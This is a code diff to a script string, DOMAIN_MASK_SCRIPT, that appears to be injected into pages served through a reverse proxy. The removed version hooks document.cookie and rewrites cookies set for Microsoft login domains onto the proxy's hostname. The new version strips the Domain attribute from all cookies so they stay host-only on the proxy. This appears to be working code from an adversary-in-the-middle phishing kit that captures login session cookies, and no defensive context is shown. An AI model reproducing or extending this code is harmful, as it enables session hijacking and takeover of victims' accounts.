@@ -261,43 +261,24 @@ const DOMAIN_MASK_SCRIPT = `
 
 
 
-    // ---- Cookie Domain Rewriter (embedded) ----
-    (function() {
-        var originalDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
-        if (!originalDescriptor) return;
-        var originalSet = originalDescriptor.set;
-        var originalGet = originalDescriptor.get;
-        var proxyDomain = window.__originalHostname || window.location.hostname;
+    // ---- Cookie Patch (strip Domain attribute) ----
+(function() {
+    var originalDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
+    if (!originalDescriptor) return;
+    var originalSet = originalDescriptor.set;
+    var originalGet = originalDescriptor.get;
 
-        var microsoftDomains = [
-            'login.microsoftonline.com',
-            'microsoftonline.com',
-            'login.windows.net',
-            'login.microsoft.com',
-            'aadcdn.msftauth.net',
-            'sts.microsoftonline.com'
-        ];
-        var domainPattern = new RegExp(
-            '\\\\bDomain\\\\s*=\\\\s*(' + microsoftDomains.join('|').replace(/\\./g, '\\\\.') + ')',
-            'i'
-        );
-
-        Object.defineProperty(document, 'cookie', {
-            get: originalGet,
-            set: function(value) {
-                var newValue = value;
-                if (value && domainPattern.test(value)) {
-                    newValue = value.replace(domainPattern, 'Domain=' + proxyDomain);
-                    if (!/Domain\\s*=/i.test(newValue)) {
-                        newValue += '; Domain=' + proxyDomain;
-                    }
-                }
-                originalSet.call(document, newValue);
-            },
-            configurable: true
-        });
-        console.log('[COOKIE PATCH] Active – cookies for Microsoft domains rewritten to:', proxyDomain);
-    })();
+    Object.defineProperty(document, 'cookie', {
+        get: originalGet,
+        set: function(value) {
+            // Remove any Domain attribute so the cookie is host‑only
+            var newValue = value.replace(/\s*;\s*domain\s*=\s*[^;]*/i, '');
+            originalSet.call(document, newValue);
+        },
+        configurable: true
+    });
+    console.log('[COOKIE PATCH] Active – all cookies will be host‑only');
+})();
 })();
 `.replace(/<\/script>/gi, '<\\/script>');
 
